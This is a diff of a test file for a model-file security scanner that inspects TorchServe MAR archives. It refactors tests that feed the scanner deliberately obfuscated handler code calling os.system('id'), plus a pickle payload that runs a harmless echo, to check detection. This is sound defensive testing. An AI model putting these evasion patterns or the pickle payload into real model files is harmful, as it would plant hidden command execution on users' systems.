@@ -9,7 +9,7 @@ import stat
 import sys
 import tempfile
 import zipfile
-from collections.abc import Mapping, Sequence
+from collections.abc import Callable, Mapping, Sequence
 from pathlib import Path
 from typing import Any, cast
 
@@ -23,6 +23,28 @@ from modelaudit.scanners.base import CheckStatus, IssueSeverity, ScanResult
 from modelaudit.scanners.torchserve_mar_scanner import TorchServeMarScanner
 from modelaudit.scanners.zip_scanner import ZipScanner
 from tests.helpers import create_mock_pytorch_zip
+from tests.helpers.file_creators import SystemCommandPayload
+
+
+def _count_matching_member_reads(
+    monkeypatch: pytest.MonkeyPatch,
+    scanner: TorchServeMarScanner,
+    matches: Callable[[str], bool],
+) -> list[int]:
+    real_read_member_bounded = scanner._read_member_bounded
+    read_count = [0]
+
+    def counting_read_member_bounded(
+        archive: zipfile.ZipFile,
+        member_info: zipfile.ZipInfo,
+        max_bytes: int,
+    ) -> bytes:
+        if matches(member_info.filename):
+            read_count[0] += 1
+        return real_read_member_bounded(archive, member_info, max_bytes)
+
+    monkeypatch.setattr(scanner, "_read_member_bounded", counting_read_member_bounded)
+    return read_count
 
 
 def _create_mar_archive(
@@ -56,11 +78,7 @@ def _build_malicious_pickle() -> bytes:
 
     # This helper intentionally builds a malicious pickle for scanner coverage.
     # The payload command is a harmless `echo` so test fixtures stay safe.
-    class DangerousPayload:
-        def __reduce__(self):
-            return (os_module.system, ("echo torchserve-mar-test",))
-
-    return pickle.dumps(DangerousPayload())
+    return pickle.dumps(SystemCommandPayload("echo torchserve-mar-test", lambda: os_module.system))
 
 
 def _failed_checks(result: ScanResult, check_name: str) -> list[Any]:
@@ -625,19 +643,7 @@ def test_unreadable_handler_returns_inconclusive_exit_code_and_is_not_cached(
         },
         filename="unreadable_handler.mar",
     )
-    original_read_member_bounded = TorchServeMarScanner._read_member_bounded
-
-    def read_with_failure(
-        self: TorchServeMarScanner,
-        archive: zipfile.ZipFile,
-        member_info: zipfile.ZipInfo,
-        max_bytes: int,
-    ) -> bytes:
-        if member_info.filename == "handler.py":
-            raise RuntimeError("CRC mismatch")
-        return original_read_member_bounded(self, archive, member_info, max_bytes)
-
-    monkeypatch.setattr(TorchServeMarScanner, "_read_member_bounded", read_with_failure)
+    _install_member_read_failure(monkeypatch, "handler.py")
 
     direct = TorchServeMarScanner().scan(str(mar_path))
     handler_failures = _failed_checks(direct, "TorchServe Handler Static Analysis")
@@ -676,23 +682,11 @@ def test_unparseable_handler_returns_inconclusive_exit_code_and_is_not_cached(tm
 
 
 def test_scan_detects_getattr_wrapped_handler_execution_primitive(tmp_path: Path) -> None:
-    manifest = {"model": {"handler": "handler.py", "serializedFile": "weights.bin"}}
-    mar_path = _create_mar_archive(
+    _assert_getattr_handler_execution(
         tmp_path,
-        manifest=manifest,
-        entries={
-            "handler.py": b"import os\n\ndef handle(data, context):\n    return getattr(os, 'system')('id')\n",
-            "weights.bin": b"weights",
-        },
-        filename="getattr_handler.mar",
+        (b"import os\n\ndef handle(data, context):\n    return getattr(os, 'system')('id')\n"),
+        ("getattr_handler.mar"),
     )
-
-    result = TorchServeMarScanner().scan(str(mar_path))
-    handler_failures = _failed_checks(result, "TorchServe Handler Static Analysis")
-
-    assert len(handler_failures) == 1
-    assert handler_failures[0].severity == IssueSeverity.CRITICAL
-    assert "os.system" in handler_failures[0].message
 
 
 @pytest.mark.parametrize(
@@ -859,10 +853,7 @@ def test_dynamic_import_handler_analysis_resolves_nested_attributes(
     handler_source: bytes,
     dangerous_name: str,
 ) -> None:
-    risky_calls, parse_error = TorchServeMarScanner()._find_high_risk_calls(handler_source)
-
-    assert parse_error is None
-    assert dangerous_name in risky_calls
+    _assert_handler_dangerous_call(handler_source, dangerous_name)
 
 
 @pytest.mark.parametrize(
@@ -876,19 +867,13 @@ def test_dynamic_import_handler_analysis_resolves_nested_attributes(
 def test_dynamic_import_handler_analysis_resolves_literal_selected_strings(
     handler_source: bytes,
 ) -> None:
-    risky_calls, parse_error = TorchServeMarScanner()._find_high_risk_calls(handler_source)
-
-    assert parse_error is None
-    assert "os.system" in risky_calls
+    _assert_handler_dangerous_call(handler_source, "os.system")
 
 
 def test_dynamic_import_handler_analysis_ignores_invalid_literal_string_selection() -> None:
     handler_source = b"def handle(data, context):\n    return getattr(__import__('os'), ['system'][1])('id')\n"
 
-    risky_calls, parse_error = TorchServeMarScanner()._find_high_risk_calls(handler_source)
-
-    assert parse_error is None
-    assert "os.system" not in risky_calls
+    _assert_handler_without_system_call(handler_source)
 
 
 @pytest.mark.parametrize(
@@ -906,10 +891,7 @@ def test_dynamic_import_handler_analysis_ignores_invalid_literal_string_selectio
     ],
 )
 def test_dynamic_import_handler_analysis_respects_shadowed_import_helpers(handler_source: bytes) -> None:
-    risky_calls, parse_error = TorchServeMarScanner()._find_high_risk_calls(handler_source)
-
-    assert parse_error is None
-    assert "os.system" not in risky_calls
+    _assert_handler_without_system_call(handler_source)
 
 
 def test_dynamic_import_handler_analysis_restores_local_import_helper() -> None:
@@ -921,10 +903,7 @@ def test_dynamic_import_handler_analysis_restores_local_import_helper() -> None:
         b"    return helper(len)\n"
     )
 
-    risky_calls, parse_error = TorchServeMarScanner()._find_high_risk_calls(handler_source)
-
-    assert parse_error is None
-    assert "os.system" in risky_calls
+    _assert_handler_dangerous_call(handler_source, "os.system")
 
 
 def test_dynamic_import_handler_analysis_keeps_possible_branch_aliases() -> None:
@@ -937,10 +916,7 @@ def test_dynamic_import_handler_analysis_keeps_possible_branch_aliases() -> None
         b"    return module.system('id')\n"
     )
 
-    risky_calls, parse_error = TorchServeMarScanner()._find_high_risk_calls(handler_source)
-
-    assert parse_error is None
-    assert "os.system" in risky_calls
+    _assert_handler_dangerous_call(handler_source, "os.system")
 
 
 def test_dynamic_import_handler_analysis_keeps_possible_branch_loader_aliases() -> None:
@@ -953,10 +929,7 @@ def test_dynamic_import_handler_analysis_keeps_possible_branch_loader_aliases() 
         b"    return load('os').system('id')\n"
     )
 
-    risky_calls, parse_error = TorchServeMarScanner()._find_high_risk_calls(handler_source)
-
-    assert parse_error is None
-    assert "os.system" in risky_calls
+    _assert_handler_dangerous_call(handler_source, "os.system")
 
 
 def test_dynamic_import_handler_analysis_keeps_falsey_branch_reachable() -> None:
@@ -968,10 +941,7 @@ def test_dynamic_import_handler_analysis_keeps_falsey_branch_reachable() -> None
         b"    return __import__('os').system('id')\n"
     )
 
-    risky_calls, parse_error = TorchServeMarScanner()._find_high_risk_calls(handler_source)
-
-    assert parse_error is None
-    assert "os.system" in risky_calls
+    _assert_handler_dangerous_call(handler_source, "os.system")
 
 
 def test_dynamic_import_handler_analysis_keeps_definitely_truthy_branch_unreachable() -> None:
@@ -983,10 +953,7 @@ def test_dynamic_import_handler_analysis_keeps_definitely_truthy_branch_unreacha
         b"    return __import__('os').system('id')\n"
     )
 
-    risky_calls, parse_error = TorchServeMarScanner()._find_high_risk_calls(handler_source)
-
-    assert parse_error is None
-    assert "os.system" not in risky_calls
+    _assert_handler_without_system_call(handler_source)
 
 
 @pytest.mark.parametrize(
@@ -1016,10 +983,7 @@ def test_dynamic_import_handler_analysis_preserves_conditional_break_aliases(loo
         b"    module = __import__('math')\n" + loop_source + b"    return module.system('id')\n"
     )
 
-    risky_calls, parse_error = TorchServeMarScanner()._find_high_risk_calls(handler_source)
-
-    assert parse_error is None
-    assert "os.system" in risky_calls
+    _assert_handler_dangerous_call(handler_source, "os.system")
 
 
 @pytest.mark.parametrize(
@@ -1049,10 +1013,7 @@ def test_dynamic_import_handler_analysis_replaces_stale_aliases_on_conditional_b
         b"    module = __import__('os')\n" + loop_source + b"    return module.system('id')\n"
     )
 
-    risky_calls, parse_error = TorchServeMarScanner()._find_high_risk_calls(handler_source)
-
-    assert parse_error is None
-    assert "os.system" not in risky_calls
+    _assert_handler_without_system_call(handler_source)
 
 
 def test_dynamic_import_handler_analysis_applies_finally_before_break_exit() -> None:
@@ -1067,10 +1028,7 @@ def test_dynamic_import_handler_analysis_applies_finally_before_break_exit() -> 
         b"    return module.system('id')\n"
     )
 
-    risky_calls, parse_error = TorchServeMarScanner()._find_high_risk_calls(handler_source)
-
-    assert parse_error is None
-    assert "os.system" in risky_calls
+    _assert_handler_dangerous_call(handler_source, "os.system")
 
 
 def test_dynamic_import_handler_analysis_drops_stale_alias_before_finally_break_exit() -> None:
@@ -1085,10 +1043,7 @@ def test_dynamic_import_handler_analysis_drops_stale_alias_before_finally_break_
         b"    return module.system('id')\n"
     )
 
-    risky_calls, parse_error = TorchServeMarScanner()._find_high_risk_calls(handler_source)
-
-    assert parse_error is None
-    assert "os.system" not in risky_calls
+    _assert_handler_without_system_call(handler_source)
 
 
 @pytest.mark.parametrize("terminal_statement", [b"return []", b"continue"])
@@ -1105,10 +1060,7 @@ def test_dynamic_import_handler_analysis_honors_finally_overriding_break(
         b"    return __import__('os').system('id')\n"
     )
 
-    risky_calls, parse_error = TorchServeMarScanner()._find_high_risk_calls(handler_source)
-
-    assert parse_error is None
-    assert "os.system" not in risky_calls
+    _assert_handler_without_system_call(handler_source)
 
 
 @pytest.mark.parametrize(
@@ -1124,10 +1076,7 @@ def test_dynamic_import_handler_analysis_honors_finally_overriding_break(
     ],
 )
 def test_dynamic_import_handler_analysis_resolves_late_global_aliases(handler_source: bytes) -> None:
-    risky_calls, parse_error = TorchServeMarScanner()._find_high_risk_calls(handler_source)
-
-    assert parse_error is None
-    assert "os.system" in risky_calls
+    _assert_handler_dangerous_call(handler_source, "os.system")
 
 
 def test_dynamic_import_handler_analysis_does_not_leak_nested_import_aliases() -> None:
@@ -1140,10 +1089,7 @@ def test_dynamic_import_handler_analysis_does_not_leak_nested_import_aliases() -
         b"    return load('os').system('id')\n"
     )
 
-    risky_calls, parse_error = TorchServeMarScanner()._find_high_risk_calls(handler_source)
-
-    assert parse_error is None
-    assert "os.system" not in risky_calls
+    _assert_handler_without_system_call(handler_source)
 
 
 @pytest.mark.parametrize(
@@ -1176,10 +1122,7 @@ def test_dynamic_import_handler_analysis_does_not_leak_nested_import_aliases() -
     ],
 )
 def test_dynamic_import_handler_analysis_tracks_bound_aliases(handler_source: bytes) -> None:
-    risky_calls, parse_error = TorchServeMarScanner()._find_high_risk_calls(handler_source)
-
-    assert parse_error is None
-    assert "os.system" in risky_calls
+    _assert_handler_dangerous_call(handler_source, "os.system")
 
 
 @pytest.mark.parametrize(
@@ -1232,10 +1175,7 @@ def test_dynamic_import_handler_analysis_closes_dynamic_execution_bypasses(
     handler_source: bytes,
     dangerous_name: str,
 ) -> None:
-    risky_calls, parse_error = TorchServeMarScanner()._find_high_risk_calls(handler_source)
-
-    assert parse_error is None
-    assert dangerous_name in risky_calls
+    _assert_handler_dangerous_call(handler_source, dangerous_name)
 
 
 @pytest.mark.parametrize(
@@ -1286,10 +1226,7 @@ def test_dynamic_import_handler_analysis_closes_dynamic_execution_bypasses(
 def test_dynamic_import_handler_analysis_avoids_non_executing_alias_false_positives(
     handler_source: bytes,
 ) -> None:
-    risky_calls, parse_error = TorchServeMarScanner()._find_high_risk_calls(handler_source)
-
-    assert parse_error is None
-    assert "os.system" not in risky_calls
+    _assert_handler_without_system_call(handler_source)
 
 
 @pytest.mark.parametrize(
@@ -1313,10 +1250,7 @@ def test_dynamic_import_handler_analysis_avoids_non_executing_alias_false_positi
 def test_dynamic_import_handler_analysis_preserves_annotation_only_runtime_bindings(
     handler_source: bytes,
 ) -> None:
-    risky_calls, parse_error = TorchServeMarScanner()._find_high_risk_calls(handler_source)
-
-    assert parse_error is None
-    assert "os.system" in risky_calls
+    _assert_handler_dangerous_call(handler_source, "os.system")
 
 
 def test_dynamic_import_handler_analysis_treats_match_captures_as_local_bindings() -> None:
@@ -1330,10 +1264,7 @@ def test_dynamic_import_handler_analysis_treats_match_captures_as_local_bindings
         b"    return load('os').system('id')\n"
     )
 
-    risky_calls, parse_error = TorchServeMarScanner()._find_high_risk_calls(handler_source)
-
-    assert parse_error is None
-    assert "os.system" not in risky_calls
+    _assert_handler_without_system_call(handler_source)
 
 
 def test_dynamic_import_handler_analysis_ignores_invalid_ctypes_library_loader_factories() -> None:
@@ -1361,10 +1292,7 @@ def test_dynamic_import_handler_analysis_does_not_leak_class_namespace_aliases_i
         b"        return load('os').system('id')\n"
     )
 
-    risky_calls, parse_error = TorchServeMarScanner()._find_high_risk_calls(handler_source)
-
-    assert parse_error is None
-    assert "os.system" not in risky_calls
+    _assert_handler_without_system_call(handler_source)
 
 
 def test_dynamic_import_handler_analysis_preserves_class_body_execution_order() -> None:
@@ -1372,10 +1300,7 @@ def test_dynamic_import_handler_analysis_preserves_class_body_execution_order() 
         b"class Handler:\n    runner = load('os').system('id')\n\nfrom importlib import import_module as load\n"
     )
 
-    risky_calls, parse_error = TorchServeMarScanner()._find_high_risk_calls(handler_source)
-
-    assert parse_error is None
-    assert "os.system" not in risky_calls
+    _assert_handler_without_system_call(handler_source)
 
 
 def test_dynamic_import_handler_analysis_replaces_rebound_lifecycle_attributes() -> None:
@@ -1389,10 +1314,7 @@ def test_dynamic_import_handler_analysis_replaces_rebound_lifecycle_attributes()
         b"        return self.module.system('id')\n"
     )
 
-    risky_calls, parse_error = TorchServeMarScanner()._find_high_risk_calls(handler_source)
-
-    assert parse_error is None
-    assert "os.system" not in risky_calls
+    _assert_handler_without_system_call(handler_source)
 
 
 def test_dynamic_import_handler_analysis_keeps_conditional_lifecycle_attributes() -> None:
@@ -1407,10 +1329,7 @@ def test_dynamic_import_handler_analysis_keeps_conditional_lifecycle_attributes(
         b"        return self.module.system('id')\n"
     )
 
-    risky_calls, parse_error = TorchServeMarScanner()._find_high_risk_calls(handler_source)
-
-    assert parse_error is None
-    assert "os.system" in risky_calls
+    _assert_handler_dangerous_call(handler_source, "os.system")
 
 
 @pytest.mark.parametrize(
@@ -1440,10 +1359,7 @@ def test_dynamic_import_handler_analysis_keeps_conditional_lifecycle_attributes(
 def test_dynamic_import_handler_analysis_preserves_enclosing_function_closures(
     handler_source: bytes,
 ) -> None:
-    risky_calls, parse_error = TorchServeMarScanner()._find_high_risk_calls(handler_source)
-
-    assert parse_error is None
-    assert "os.system" in risky_calls
+    _assert_handler_dangerous_call(handler_source, "os.system")
 
 
 @pytest.mark.parametrize(
@@ -1488,10 +1404,7 @@ def test_dynamic_import_handler_analysis_preserves_enclosing_function_closures(
 def test_dynamic_import_handler_analysis_closes_iterable_pattern_and_closure_bypasses(
     handler_source: bytes,
 ) -> None:
-    risky_calls, parse_error = TorchServeMarScanner()._find_high_risk_calls(handler_source)
-
-    assert parse_error is None
-    assert "os.system" in risky_calls
+    _assert_handler_dangerous_call(handler_source, "os.system")
 
 
 def test_dynamic_import_handler_analysis_keeps_comprehension_targets_scoped() -> None:
@@ -1503,10 +1416,7 @@ def test_dynamic_import_handler_analysis_keeps_comprehension_targets_scoped() ->
         b"    return module('os').system('id')\n"
     )
 
-    risky_calls, parse_error = TorchServeMarScanner()._find_high_risk_calls(handler_source)
-
-    assert parse_error is None
-    assert "os.system" in risky_calls
+    _assert_handler_dangerous_call(handler_source, "os.system")
 
 
 @pytest.mark.parametrize(
@@ -1534,10 +1444,7 @@ def test_dynamic_import_handler_analysis_keeps_comprehension_targets_scoped() ->
 def test_dynamic_import_handler_analysis_closes_callable_and_walrus_bypasses(
     handler_source: bytes,
 ) -> None:
-    risky_calls, parse_error = TorchServeMarScanner()._find_high_risk_calls(handler_source)
-
-    assert parse_error is None
-    assert "os.system" in risky_calls
+    _assert_handler_dangerous_call(handler_source, "os.system")
 
 
 @pytest.mark.parametrize(
@@ -1582,10 +1489,7 @@ def test_dynamic_import_handler_analysis_closes_callable_and_walrus_bypasses(
 def test_dynamic_import_handler_analysis_closes_literal_helper_and_callback_bypasses(
     handler_source: bytes,
 ) -> None:
-    risky_calls, parse_error = TorchServeMarScanner()._find_high_risk_calls(handler_source)
-
-    assert parse_error is None
-    assert "os.system" in risky_calls
+    _assert_handler_dangerous_call(handler_source, "os.system")
 
 
 @pytest.mark.parametrize(
@@ -1624,10 +1528,7 @@ def test_dynamic_import_handler_analysis_tracks_executed_callable_arguments(
     handler_source: bytes,
     dangerous_name: str,
 ) -> None:
-    risky_calls, parse_error = TorchServeMarScanner()._find_high_risk_calls(handler_source)
-
-    assert parse_error is None
-    assert dangerous_name in risky_calls
+    _assert_handler_dangerous_call(handler_source, dangerous_name)
 
 
 @pytest.mark.parametrize(
@@ -1641,10 +1542,7 @@ def test_dynamic_import_handler_analysis_tracks_literal_selected_static_callable
     handler_source: bytes,
     dangerous_name: str,
 ) -> None:
-    risky_calls, parse_error = TorchServeMarScanner()._find_high_risk_calls(handler_source)
-
-    assert parse_error is None
-    assert dangerous_name in risky_calls
+    _assert_handler_dangerous_call(handler_source, dangerous_name)
 
 
 @pytest.mark.parametrize(
@@ -1682,10 +1580,7 @@ def test_dynamic_import_handler_analysis_tracks_literal_selected_static_callable
 def test_dynamic_import_handler_analysis_does_not_execute_callbacks_for_empty_inputs(
     handler_source: bytes,
 ) -> None:
-    risky_calls, parse_error = TorchServeMarScanner()._find_high_risk_calls(handler_source)
-
-    assert parse_error is None
-    assert "os.system" not in risky_calls
+    _assert_handler_without_system_call(handler_source)
 
 
 def test_dynamic_import_handler_analysis_consumes_all_map_inputs_when_nonempty() -> None:
@@ -1695,10 +1590,7 @@ def test_dynamic_import_handler_analysis_consumes_all_map_inputs_when_nonempty()
         b"(__import__('os').system('id') for _ in [1])))\n"
     )
 
-    risky_calls, parse_error = TorchServeMarScanner()._find_high_risk_calls(handler_source)
-
-    assert parse_error is None
-    assert "os.system" in risky_calls
+    _assert_handler_dangerous_call(handler_source, "os.system")
 
 
 @pytest.mark.parametrize(
@@ -1749,10 +1641,7 @@ def test_dynamic_import_handler_analysis_honors_namespace_subscript_rebinding(
         b"    return load('os').system('id')\n"
     )
 
-    risky_calls, parse_error = TorchServeMarScanner()._find_high_risk_calls(handler_source)
-
-    assert parse_error is None
-    assert "os.system" not in risky_calls
+    _assert_handler_without_system_call(handler_source)
 
 
 def test_dynamic_import_handler_analysis_does_not_treat_function_vars_as_globals() -> None:
@@ -1763,10 +1652,7 @@ def test_dynamic_import_handler_analysis_does_not_treat_function_vars_as_globals
         b"    return load('os').system('id')\n"
     )
 
-    risky_calls, parse_error = TorchServeMarScanner()._find_high_risk_calls(handler_source)
-
-    assert parse_error is None
-    assert "os.system" in risky_calls
+    _assert_handler_dangerous_call(handler_source, "os.system")
 
 
 @pytest.mark.parametrize(
@@ -1797,10 +1683,7 @@ def test_dynamic_import_handler_analysis_does_not_treat_function_vars_as_globals
     ],
 )
 def test_dynamic_import_handler_analysis_applies_called_scope_setters(handler_source: bytes) -> None:
-    risky_calls, parse_error = TorchServeMarScanner()._find_high_risk_calls(handler_source)
-
-    assert parse_error is None
-    assert "os.system" in risky_calls
+    _assert_handler_dangerous_call(handler_source, "os.system")
 
 
 def test_dynamic_import_handler_analysis_merges_conditional_setter_definitions() -> None:
@@ -1820,10 +1703,7 @@ def test_dynamic_import_handler_analysis_merges_conditional_setter_definitions()
         b"    return load('os').system('id')\n"
     )
 
-    risky_calls, parse_error = TorchServeMarScanner()._find_high_risk_calls(handler_source)
-
-    assert parse_error is None
-    assert "os.system" in risky_calls
+    _assert_handler_dangerous_call(handler_source, "os.system")
 
 
 def test_dynamic_import_handler_analysis_replaces_sequential_setter_definition() -> None:
@@ -1841,10 +1721,7 @@ def test_dynamic_import_handler_analysis_replaces_sequential_setter_definition()
         b"    return load('os').system('id')\n"
     )
 
-    risky_calls, parse_error = TorchServeMarScanner()._find_high_risk_calls(handler_source)
-
-    assert parse_error is None
-    assert "os.system" not in risky_calls
+    _assert_handler_without_system_call(handler_source)
 
 
 @pytest.mark.parametrize(
@@ -1875,10 +1752,7 @@ def test_dynamic_import_handler_analysis_replaces_sequential_setter_definition()
     ],
 )
 def test_dynamic_import_handler_analysis_follows_called_function_returns(handler_source: bytes) -> None:
-    risky_calls, parse_error = TorchServeMarScanner()._find_high_risk_calls(handler_source)
-
-    assert parse_error is None
-    assert "os.system" in risky_calls
+    _assert_handler_dangerous_call(handler_source, "os.system")
 
 
 def test_dynamic_import_handler_analysis_does_not_execute_unused_function_return() -> None:
@@ -1890,10 +1764,7 @@ def test_dynamic_import_handler_analysis_does_not_execute_unused_function_return
         b"    return []\n"
     )
 
-    risky_calls, parse_error = TorchServeMarScanner()._find_high_risk_calls(handler_source)
-
-    assert parse_error is None
-    assert "os.system" not in risky_calls
+    _assert_handler_without_system_call(handler_source)
 
 
 def test_dynamic_import_handler_analysis_ignores_unreachable_function_return() -> None:
@@ -1907,10 +1778,7 @@ def test_dynamic_import_handler_analysis_ignores_unreachable_function_return() -
         b"    return get_loader()('os').system('id')\n"
     )
 
-    risky_calls, parse_error = TorchServeMarScanner()._find_high_risk_calls(handler_source)
-
-    assert parse_error is None
-    assert "os.system" not in risky_calls
+    _assert_handler_without_system_call(handler_source)
 
 
 def test_dynamic_import_handler_analysis_ignores_unused_global_setter() -> None:
@@ -1924,10 +1792,7 @@ def test_dynamic_import_handler_analysis_ignores_unused_global_setter() -> None:
         b"    return load([1])\n"
     )
 
-    risky_calls, parse_error = TorchServeMarScanner()._find_high_risk_calls(handler_source)
-
-    assert parse_error is None
-    assert "os.system" not in risky_calls
+    _assert_handler_without_system_call(handler_source)
 
 
 def test_dynamic_import_handler_analysis_does_not_leak_called_setter_from_unused_function() -> None:
@@ -1942,10 +1807,7 @@ def test_dynamic_import_handler_analysis_does_not_leak_called_setter_from_unused
         b"load('os').system('id')\n"
     )
 
-    risky_calls, parse_error = TorchServeMarScanner()._find_high_risk_calls(handler_source)
-
-    assert parse_error is None
-    assert "os.system" not in risky_calls
+    _assert_handler_without_system_call(handler_source)
 
 
 def test_dynamic_import_handler_analysis_propagates_transitive_global_setter_call() -> None:
@@ -1963,10 +1825,7 @@ def test_dynamic_import_handler_analysis_propagates_transitive_global_setter_cal
         b"    return load('os').system('id')\n"
     )
 
-    risky_calls, parse_error = TorchServeMarScanner()._find_high_risk_calls(handler_source)
-
-    assert parse_error is None
-    assert "os.system" in risky_calls
+    _assert_handler_dangerous_call(handler_source, "os.system")
 
 
 def test_dynamic_import_handler_analysis_does_not_persist_globals_from_unexecuted_outer_call() -> None:
@@ -1983,10 +1842,7 @@ def test_dynamic_import_handler_analysis_does_not_persist_globals_from_unexecute
         b"load('os').system('id')\n"
     )
 
-    risky_calls, parse_error = TorchServeMarScanner()._find_high_risk_calls(handler_source)
-
-    assert parse_error is None
-    assert "os.system" not in risky_calls
+    _assert_handler_without_system_call(handler_source)
 
 
 @pytest.mark.parametrize(
@@ -1997,10 +1853,7 @@ def test_dynamic_import_handler_analysis_does_not_persist_globals_from_unexecute
     ],
 )
 def test_dynamic_import_handler_analysis_handles_recursive_lazy_aliases(handler_source: bytes) -> None:
-    risky_calls, parse_error = TorchServeMarScanner()._find_high_risk_calls(handler_source)
-
-    assert parse_error is None
-    assert "os.system" not in risky_calls
+    _assert_handler_without_system_call(handler_source)
 
 
 @pytest.mark.parametrize(
@@ -2021,10 +1874,7 @@ def test_dynamic_import_handler_analysis_handles_recursive_lazy_aliases(handler_
 def test_dynamic_import_handler_analysis_keeps_risks_in_recursive_lazy_aliases(
     handler_source: bytes,
 ) -> None:
-    risky_calls, parse_error = TorchServeMarScanner()._find_high_risk_calls(handler_source)
-
-    assert parse_error is None
-    assert "os.system" in risky_calls
+    _assert_handler_dangerous_call(handler_source, "os.system")
 
 
 def test_dynamic_import_handler_analysis_merges_many_aliases_without_serializing_ast(
@@ -2057,10 +1907,7 @@ def test_dynamic_import_handler_analysis_follows_called_getattr_defaults() -> No
         b"    return getattr(__import__('os'), 'definitely_missing', __import__('os').system)('id')\n"
     )
 
-    risky_calls, parse_error = TorchServeMarScanner()._find_high_risk_calls(handler_source)
-
-    assert parse_error is None
-    assert "os.system" in risky_calls
+    _assert_handler_dangerous_call(handler_source, "os.system")
 
 
 def test_dynamic_import_handler_analysis_does_not_execute_unused_getattr_defaults() -> None:
@@ -2070,10 +1917,7 @@ def test_dynamic_import_handler_analysis_does_not_execute_unused_getattr_default
         b"    return []\n"
     )
 
-    risky_calls, parse_error = TorchServeMarScanner()._find_high_risk_calls(handler_source)
-
-    assert parse_error is None
-    assert "os.system" not in risky_calls
+    _assert_handler_without_system_call(handler_source)
 
 
 def test_dynamic_import_handler_analysis_does_not_call_getattr_default_for_known_attribute() -> None:
@@ -2081,10 +1925,7 @@ def test_dynamic_import_handler_analysis_does_not_call_getattr_default_for_known
         b"def handle(data, context):\n    return getattr(__import__('math'), 'sqrt', __import__('os').system)(4)\n"
     )
 
-    risky_calls, parse_error = TorchServeMarScanner()._find_high_risk_calls(handler_source)
-
-    assert parse_error is None
-    assert "os.system" not in risky_calls
+    _assert_handler_without_system_call(handler_source)
 
 
 @pytest.mark.parametrize(
@@ -2207,10 +2048,7 @@ def test_dynamic_import_handler_analysis_does_not_call_getattr_default_for_known
     ],
 )
 def test_dynamic_import_handler_analysis_tracks_reachable_runtime_aliases(handler_source: bytes) -> None:
-    risky_calls, parse_error = TorchServeMarScanner()._find_high_risk_calls(handler_source)
-
-    assert parse_error is None
-    assert "os.system" in risky_calls
+    _assert_handler_dangerous_call(handler_source, "os.system")
 
 
 @pytest.mark.parametrize(
@@ -2273,10 +2111,7 @@ def test_dynamic_import_handler_analysis_tracks_reachable_runtime_aliases(handle
     ],
 )
 def test_dynamic_import_handler_analysis_ignores_unreachable_runtime_aliases(handler_source: bytes) -> None:
-    risky_calls, parse_error = TorchServeMarScanner()._find_high_risk_calls(handler_source)
-
-    assert parse_error is None
-    assert "os.system" not in risky_calls
+    _assert_handler_without_system_call(handler_source)
 
 
 @pytest.mark.parametrize(
@@ -2294,10 +2129,7 @@ def test_dynamic_import_handler_analysis_ignores_unreachable_runtime_aliases(han
 def test_dynamic_import_handler_analysis_resolves_namespace_mapping_get_calls(
     handler_source: bytes,
 ) -> None:
-    risky_calls, parse_error = TorchServeMarScanner()._find_high_risk_calls(handler_source)
-
-    assert parse_error is None
-    assert "os.system" in risky_calls
+    _assert_handler_dangerous_call(handler_source, "os.system")
 
 
 def test_dynamic_import_handler_analysis_respects_shadowed_namespace_mapping_helper() -> None:
@@ -2307,10 +2139,7 @@ def test_dynamic_import_handler_analysis_respects_shadowed_namespace_mapping_hel
         b"    return vars(__import__('os')).get('system')('id')\n"
     )
 
-    risky_calls, parse_error = TorchServeMarScanner()._find_high_risk_calls(handler_source)
-
-    assert parse_error is None
-    assert "os.system" not in risky_calls
+    _assert_handler_without_system_call(handler_source)
 
 
 @pytest.mark.parametrize(
@@ -2329,10 +2158,7 @@ def test_dynamic_import_handler_analysis_respects_shadowed_namespace_mapping_hel
 def test_dynamic_import_handler_analysis_avoids_deleted_and_lambda_alias_false_positives(
     handler_source: bytes,
 ) -> None:
-    risky_calls, parse_error = TorchServeMarScanner()._find_high_risk_calls(handler_source)
-
-    assert parse_error is None
-    assert "os.system" not in risky_calls
+    _assert_handler_without_system_call(handler_source)
 
 
 def test_dynamic_import_handler_analysis_keeps_literal_loop_exit_binding() -> None:
@@ -2343,10 +2169,7 @@ def test_dynamic_import_handler_analysis_keeps_literal_loop_exit_binding() -> No
         b"    return module.system('id')\n"
     )
 
-    risky_calls, parse_error = TorchServeMarScanner()._find_high_risk_calls(handler_source)
-
-    assert parse_error is None
-    assert "os.system" not in risky_calls
+    _assert_handler_without_system_call(handler_source)
 
 
 def test_dynamic_import_handler_analysis_evaluates_defaults_at_definition_time() -> None:
@@ -2357,10 +2180,7 @@ def test_dynamic_import_handler_analysis_evaluates_defaults_at_definition_time()
         b"from importlib import import_module as load\n"
     )
 
-    risky_calls, parse_error = TorchServeMarScanner()._find_high_risk_calls(handler_source)
-
-    assert parse_error is None
-    assert "os.system" not in risky_calls
+    _assert_handler_without_system_call(handler_source)
 
 
 def test_dynamic_import_handler_analysis_tracks_mapping_rest_captures() -> None:
@@ -2371,10 +2191,7 @@ def test_dynamic_import_handler_analysis_tracks_mapping_rest_captures() -> None:
         b"            return rest['module'].system('id')\n"
     )
 
-    risky_calls, parse_error = TorchServeMarScanner()._find_high_risk_calls(handler_source)
-
-    assert parse_error is None
-    assert "os.system" in risky_calls
+    _assert_handler_dangerous_call(handler_source, "os.system")
 
 
 def test_dynamic_import_handler_analysis_excludes_matched_keys_from_mapping_rest() -> None:
@@ -2385,10 +2202,7 @@ def test_dynamic_import_handler_analysis_excludes_matched_keys_from_mapping_rest
         b"            return rest['module'].system('id')\n"
     )
 
-    risky_calls, parse_error = TorchServeMarScanner()._find_high_risk_calls(handler_source)
-
-    assert parse_error is None
-    assert "os.system" not in risky_calls
+    _assert_handler_without_system_call(handler_source)
 
 
 def test_dynamic_import_handler_analysis_skips_nonmatching_mapping_patterns() -> None:
@@ -2399,10 +2213,7 @@ def test_dynamic_import_handler_analysis_skips_nonmatching_mapping_patterns() ->
         b"            return rest['module'].system('id')\n"
     )
 
-    risky_calls, parse_error = TorchServeMarScanner()._find_high_risk_calls(handler_source)
-
-    assert parse_error is None
-    assert "os.system" not in risky_calls
+    _assert_handler_without_system_call(handler_source)
 
 
 def test_dynamic_import_handler_analysis_carries_failed_match_guard_side_effects() -> None:
@@ -2415,10 +2226,7 @@ def test_dynamic_import_handler_analysis_carries_failed_match_guard_side_effects
         b"            return module.system('id')\n"
     )
 
-    risky_calls, parse_error = TorchServeMarScanner()._find_high_risk_calls(handler_source)
-
-    assert parse_error is None
-    assert "os.system" in risky_calls
+    _assert_handler_dangerous_call(handler_source, "os.system")
 
 
 def test_dynamic_import_handler_analysis_replaces_state_in_failed_match_guards() -> None:
@@ -2432,10 +2240,7 @@ def test_dynamic_import_handler_analysis_replaces_state_in_failed_match_guards()
